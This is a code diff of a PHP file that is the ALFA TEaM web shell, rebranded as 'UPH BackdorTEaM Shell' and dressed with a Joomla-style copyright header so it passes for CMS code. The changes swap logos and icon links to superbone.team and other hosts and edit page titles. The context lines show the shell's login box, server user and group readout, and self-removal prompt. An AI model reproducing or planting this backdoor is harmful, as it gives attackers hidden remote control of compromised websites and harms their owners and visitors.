@@ -1,5 +1,6 @@
 <?php 
 /**
+ * * Created Superbone clean code ALFA TEAMS
  * @package libraryAdministrator
  * @subpackage Application
  * @copyright Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
@@ -396,8 +397,8 @@ body{background: black;}
 #loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
-<title>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.' ~</title><center>
-<center><img style="border-radius:100px;" width="500" height="250" alt="" src="http://solevisible.com/images/alfa-iran.png" /></center>
+<title>~ UPH TEaM Shell-v'.__ALFA_VERSION__.' ~</title><center>
+<center><img style="border-radius:100px;" width="500" height="250" alt="" src="https://superbone.team/assets/ngeloduph.png" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
 <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.' ~</b></font></th></tr>
@@ -881,7 +882,7 @@ echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
 <link href="'.__showicon('alfamini').'" rel="icon" type="image/x-icon"/>
-<title>..:: '.$_SERVER['HTTP_HOST'].' ~ ALFA TEaM Shell - v'.__ALFA_VERSION__.' ::..</title>
+<title>..:: '.$_SERVER['HTTP_HOST'].' ~ UPH BackdorTEaM Shell - v'.__ALFA_VERSION__.' ::..</title>
 <link href="https://fonts.googleapis.com/css?family=Francois+One" rel="stylesheet">
 <style type="text/css">
 .hlabale {
@@ -1758,7 +1759,7 @@ echo '<input type="hidden" name="charset">
 <tr>
 <td><span class="header_vars">User:</span></td>
 <td><span class="header_values" id="header_userid">'. $uid . ' [ ' . $user . ']</span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $gid . ' [ ' . $group . ' ]</span> </td>
-<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="" src="https://res.cloudinary.com/dq8vcc8q6/image/upload/v1748284866/uphteam.png" /></td>
+<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="200" alt="" src="https://res.cloudinary.com/dq8vcc8q6/image/upload/v1750277418/uph_1_wf77u1.png" /></td>
 </tr>
 <tr>
 <td><span class="header_vars">PHP:</span></td>
@@ -1885,8 +1886,8 @@ function showAnimation($name){
 }
 function __showicon($r){
 	$s['btn']='http://solevisible.com/images/btn.png';
-	$s['alfamini']='http://solevisible.com/images/alfamini.png';
-	$s['loader']='http://solevisible.com/images/loader.png';
+	$s['alfamini']='https://superbone.team/assets/uphmini.png';
+	$s['loader']='https://superbone.team/assets/load-uph.png';
 	//return 'data:image/png;base64,'.__get_resource($s[$r]);
 	return $s[$r];
 }
@@ -2205,7 +2206,7 @@ echo($msg);
 }catch(Exception $e){
 echo $e->getMessage();
 }}elseif($_POST['alfa1']=='about'){
-echo __pre()."<pre><center><img src='http://solevisible.com/images/farvahar-iran.png'><br>
+echo __pre()."<pre><center><img src='https://superbone.team/assets/ngeloduph.png'><br>
 <b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
 <font color='#00A220'>Shell Coded By UPH BackdorShell (ALFA TEaM)</font><br>
 <font color='#00A220'>Contact : solevisible@gmail.com</font><br>
@@ -5286,7 +5287,7 @@ echo('</center>');
 if(isset($_POST['alfa1'])&&$_POST['alfa1']!='yes'){
 echo "<div class=header>";
 echo "
-<center><p><img src=\"http://solevisible.com/images/farvahar-iran.png\"></p>";
+<center><p><img src=\"https://superbone.team/assets/ngeloduph.png\"></p>";
 echo '<p><div class="txtfont">Do you want to destroy me?!</div><a href=javascript:void(0) onclick="g(\'selfrm\',null,\'yes\');"> Yes</a>';
 echo '</p></center></div>';
 }
